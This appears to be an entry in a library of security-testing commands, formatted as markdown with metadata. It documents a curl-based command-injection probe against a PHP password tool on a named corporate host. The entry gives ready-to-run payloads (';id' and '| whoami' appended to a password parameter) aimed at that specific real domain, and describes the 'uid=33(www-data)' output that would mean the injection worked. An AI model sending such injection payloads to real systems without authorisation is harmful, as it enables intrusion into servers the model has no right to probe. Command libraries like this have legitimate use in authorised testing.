---
id: uuid-1234-5678-9abc-def4
data: 'curl "http://tw.corp.ubnt.com/tools/ntpasswd.php?password=test;id" -v'
tags:
  - fuzzing
  - command-injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.677Z'
verified: false
validated: true
submitted: true
---
# curl-fuzz-password

## Command

```bash
curl "http://tw.corp.ubnt.com/tools/ntpasswd.php?password=test;id" -v
```

## Description

This curl command sends a fuzzed payload to the ntpasswd.php endpoint to test for command injection by appending a semicolon and 'id' command to the password parameter, verbose output helps inspect responses for leaked command results.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `password=test;id` | Fuzzed input with injection payload | Yes |
| `-v` | Verbose mode to show headers and response details | No |

## Examples

### Basic Usage

```bash
curl "http://tw.corp.ubnt.com/tools/ntpasswd.php?password=test;id"
```

### Advanced Usage

```bash
curl "http://tw.corp.ubnt.com/tools/ntpasswd.php?password=test%20%7C%20whoami" -v -H "User-Agent: Mozilla/5.0"
```

## Expected Output

If vulnerable, the response body includes output like "uid=33(www-data) gid=33(www-data)" mixed with hash results, indicating successful injection.

## Related

- [[Related Procedure: Fuzz Endpoint for Command Injection]]
